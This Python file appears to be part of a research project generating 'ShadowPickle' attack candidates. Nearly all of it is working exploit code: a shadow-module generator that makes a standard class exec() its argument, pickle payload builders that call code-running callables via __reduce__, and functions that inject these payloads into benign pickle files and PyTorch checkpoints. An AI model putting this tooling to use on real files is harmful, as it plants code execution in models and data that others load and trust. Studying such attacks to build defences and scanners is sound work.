"""ShadowPickle attack templates for candidate generation (Phase 2).

Provides parameterized templates for the three classes of ShadowPickle attacks:
- T2.1: Overwritten-Module Attack
- T2.2: PyPI-Injected Attack
- T2.3: External-Module Attack
"""

from __future__ import annotations

import pickle
import sys
import types
from typing import Any


class AttackTemplate:
    """Base class for all ShadowPickle attack templates."""

    def generate_pickle_payload(self, payload_code: str) -> bytes:
        """Return the pickle bytes that trigger this attack with the given payload code."""
        raise NotImplementedError


class OverwrittenModuleTemplate(AttackTemplate):
    """
    T2.1: Overwritten-Module Attack Template.
    
    This attack shadows a standard/builtin class (e.g. collections.OrderedDict)
    with a malicious implementation that runs exec() during instantiation.
    """

    def __init__(self, module_name: str = "collections", class_name: str = "OrderedDict"):
        self.module_name = module_name
        self.class_name = class_name

    def generate_module_code(self) -> str:
        """
        Generate the Python source code of the shadow module.
        When placed in the python path (shadowing the real module), this code
        dynamically loads the real module, copies its attributes, and overrides
        the target class to execute any string argument in __new__.
        """
        return f'''# Auto-generated shadow module for {self.module_name}.{self.class_name}
import sys
import os
import importlib

# Remove current directory from sys.path to find and import the original/real module
self_dir = os.path.dirname(__file__)
original_path = sys.path.copy()
sys.path = [p for p in sys.path if p != self_dir]

# Temporarily remove this module from sys.modules to prevent circular import
shadow_module = sys.modules.pop("{self.module_name}", None)

try:
    real_module = importlib.import_module("{self.module_name}")
finally:
    sys.path = original_path
    if shadow_module is not None:
        sys.modules["{self.module_name}"] = shadow_module

# Copy all attributes from the real module to this shadow module's namespace
globals().update({{k: v for k, v in real_module.__dict__.items() if k not in ["__name__", "__file__", "__package__", "__loader__", "__spec__"]}})

# Define the malicious subclass that overrides __new__ and __init__ to execute string inputs
class Malicious{self.class_name}(real_module.{self.class_name}):
    def __new__(cls, *args, **kwargs):
        if args and isinstance(args[0], str):
            # Run the payload code
            exec(args[0])
            # Return a clean instance of the base class
            return real_module.{self.class_name}.__new__(cls)
        return real_module.{self.class_name}.__new__(cls, *args, **kwargs)

    def __init__(self, *args, **kwargs):
        if args and isinstance(args[0], str):
            real_module.{self.class_name}.__init__(self)
        else:
            real_module.{self.class_name}.__init__(self, *args, **kwargs)

{self.class_name} = Malicious{self.class_name}
'''

    def generate_pickle_payload(self, payload_code: str) -> bytes:
        """Generate the pickle bytes instantiating the overwritten module class with payload_code."""
        return _generate_payload(self.module_name, self.class_name, payload_code)


class PyPIInjectedTemplate(AttackTemplate):
    """
    T2.2: PyPI-Injected Attack Template.
    
    Imports a callable from a third-party PyPI library that naturally executes code.
    """

    def __init__(self, module_name: str, callable_name: str):
        self.module_name = module_name
        self.callable_name = callable_name

    def generate_pickle_payload(self, payload_code: str) -> bytes:
        """Generate the pickle bytes calling the PyPI library callable with payload_code."""
        return _generate_payload(self.module_name, self.callable_name, payload_code)


class ExternalModuleTemplate(AttackTemplate):
    """
    T2.3: External-Module Attack Template.
    
    Imports a built-in/existing callable (like numpy.testing._private.utils.runstring)
    to execute code.
    """

    def __init__(self, module_name: str, callable_name: str):
        self.module_name = module_name
        self.callable_name = callable_name

    def generate_pickle_payload(self, payload_code: str) -> bytes:
        """Generate the pickle bytes calling the external module callable with payload_code."""
        return _generate_payload(self.module_name, self.callable_name, payload_code)


def _generate_payload(module_name: str, class_name: str, payload_code: str) -> bytes:
    """Generate the pickle bytes using a temporary placeholder class, cleaning up sys.modules afterwards."""
    existed = module_name in sys.modules
    cls = _get_placeholder_class(module_name, class_name)

    class _PayloadHelper:
        def __init__(self, target_cls, payload):
            self.target_cls = target_cls
            self.payload = payload

        def __reduce__(self):
            return (self.target_cls, (self.payload,))

    try:
        return pickle.dumps(_PayloadHelper(cls, payload_code))
    finally:
        if not existed:
            sys.modules.pop(module_name, None)


def _get_placeholder_class(module_name: str, class_name: str) -> type:
    """Helper to dynamically create/get a dummy class on a dummy module to satisfy pickle.dumps check."""
    if module_name not in sys.modules:
        mod = types.ModuleType(module_name)
        sys.modules[module_name] = mod
    else:
        mod = sys.modules[module_name]

    if not hasattr(mod, class_name):
        cls = type(class_name, (object,), {})
        cls.__module__ = module_name
        cls.__qualname__ = class_name
        setattr(mod, class_name, cls)
    else:
        cls = getattr(mod, class_name)

    return cls


class _InjectHelper:
    """A helper object that has a custom unpickler state to inject arbitrary pickle payloads."""

    def __init__(self, pickle_bytes: bytes):
        self.pickle_bytes = pickle_bytes

    def __reduce__(self):
        # When unpickling, load the embedded pickle payload directly.
        # This allows injecting raw pickle bytes into another object graph.
        return (pickle.loads, (self.pickle_bytes,))


def inject_payload_into_pickle(benign_pkl_path: str, malicious_pkl_path: str, payload_bytes: bytes) -> None:
    """Load a benign pickle file, insert the payload helper object, and save to malicious_pkl_path."""
    with open(benign_pkl_path, "rb") as f:
        data = pickle.load(f)

    helper = _InjectHelper(payload_bytes)
    if isinstance(data, dict):
        data["_shadowpickle_payload"] = helper
    elif isinstance(data, list):
        data.append(helper)
    else:
        data = [data, helper]

    with open(malicious_pkl_path, "wb") as f:
        pickle.dump(data, f)


def inject_payload_into_torch(benign_pt_path: str, malicious_pt_path: str, payload_bytes: bytes) -> None:
    """Load a benign PyTorch model safely, insert the payload helper object, and save to malicious_pt_path."""
    import torch

    # Load safely using weights_only=True so no code runs during serialization
    state_dict = torch.load(benign_pt_path, map_location="cpu", weights_only=True)
    
    state_dict["_shadowpickle_payload"] = _InjectHelper(payload_bytes)
    
    torch.save(state_dict, malicious_pt_path)
